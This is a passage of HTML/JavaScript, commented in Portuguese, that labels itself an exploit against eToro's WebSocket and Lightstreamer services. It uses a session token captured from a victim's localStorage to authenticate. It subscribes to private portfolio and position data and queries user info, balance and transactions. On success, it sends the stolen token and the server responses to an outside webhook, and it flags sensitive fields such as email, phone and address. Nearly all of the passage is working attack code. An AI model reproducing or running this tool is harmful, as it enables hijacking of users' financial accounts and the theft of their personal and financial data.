                        const msg = {
                            id: crypto.randomUUID(),
                            operation: "Authenticate",
                            data: attempt.data
                        };
                        ws.send(JSON.stringify(msg));
                        addLog(`📤 ${attempt.name}: ${JSON.stringify(msg).substring(0, 200)}...`, 'info');
                    }, i * 3000);
                });
                
                // Depois de tentar autenticar, tenta acessar dados
                setTimeout(() => {
                    const subscribeMsg = {
                        id: crypto.randomUUID(),
                        operation: "Subscribe",
                        data: {
                            topics: ["private", "portfolio", "positions"],
                            snapshot: true
                        }
                    };
                    ws.send(JSON.stringify(subscribeMsg));
                    addLog('📊 Tentando acessar dados PRIVADOS do usuário...', 'critical');
                }, 15000);
            };
            
            ws.onmessage = (event) => {
                let data = event.data;
                if (typeof data === 'object') data = JSON.stringify(data);
                
                addLog(`📥 RESPOSTA: ${data.substring(0, 500)}`, 
                       data.includes('success":true') ? 'success' : 'info');
                
                // Se conseguir autenticar, isso é CRÍTICO
                if (data.includes('success":true')) {
                    addLog('🔥🔥🔥 AUTENTICAÇÃO FUNCIONOU! TOKEN É VÁLIDO! 🔥🔥🔥', 'critical');
                    addLog('🎯 VOCÊ TEM ACESSO AOS DADOS DO USUÁRIO!', 'critical');
                    
                    // Envia o token completo para o webhook
                    fetch(WEBHOOK, {
                        method: 'POST',
                        mode: 'no-cors',
                        body: JSON.stringify({ 
                            type: 'VALID_TOKEN', 
                            token: document.getElementById('tokenInput').value,
                            response: data 
                        })
                    });
                }
                
                // Procura por dados sensíveis
                const sensitivePatterns = ['balance', 'position', 'portfolio', 'email', 'phone', 'address', 'transaction'];
                for (const pattern of sensitivePatterns) {
                    if (data.toLowerCase().includes(pattern)) {
                        addLog(`🔓 DADO SENSÍVEL ENCONTRADO: ${pattern}`, 'critical');
                    }
                }
            };
            
            ws.onerror = (error) => addLog(`❌ Erro: ${error}`, 'error');
        }
        
        function testTokenOnWebSocket() {
            addLog('🔄 Testando token diretamente no WebSocket (formato Lightstreamer)', 'info');
            
            const ws2 = new WebSocket("wss://push-lightstreamer.cloud.etoro.com/lightstreamer");
            
            ws2.onopen = () => {
                const token = document.getElementById('tokenInput').value;
                const commands = [
                    `create_session\r\nLS_user=${token}&LS_adapter_set=PROXY_PUSH`,
                    `create_session\r\nLS_user=anonymous&LS_token=${token}`,
                    `control\r\nLS_op=auth&LS_token=${token}`
                ];
                
                commands.forEach((cmd, i) => {
                    setTimeout(() => {
                        ws2.send(cmd);
                        addLog(`📤 Lightstreamer: ${cmd.replace(/\n/g, '\\n').substring(0, 150)}`, 'info');
                    }, i * 2000);
                });
            };
            
            ws2.onmessage = (e) => addLog(`📥 Lightstreamer: ${e.data}`, 'info');
        }
        
        function extractUserData() {
            addLog('🔍 Tentando extrair dados do usuário via WebSocket', 'info');
            
            if (!ws || ws.readyState !== WebSocket.OPEN) {
                addLog('❌ Primeiro execute o EXPLOIT para conectar', 'error');
                return;
            }
            
            const queries = [
                { operation: "GetUserInfo", data: {} },
                { operation: "GetPortfolio", data: { snapshot: true } },
                { operation: "GetBalance", data: {} },
                { operation: "GetPositions", data: { status: "open" } },
                { operation: "GetTransactions", data: { limit: 50 } }
            ];
            
            queries.forEach((query, i) => {
                setTimeout(() => {
                    const msg = {
                        id: crypto.randomUUID(),
                        operation: query.operation,
                        data: query.data
                    };
                    ws.send(JSON.stringify(msg));
                    addLog(`📤 ${query.operation}: ${JSON.stringify(msg)}`, 'info');
                }, i * 2000);
            });
        }
        
        function clearLogs() {
            document.getElementById('logs').innerHTML = '';
            addLog('Logs limpos', 'info');
        }
        
        addLog('✅ EXPLOIT CARREGADO', 'critical');
        addLog('📌 COLE O TOKEN COMPLETO capturado do localStorage no campo acima', 'critical');
        addLog('🎯 O token começa com "eyJhbGciOiJkaXIi..." - copie o valor COMPLETO', 'info');
    </script>
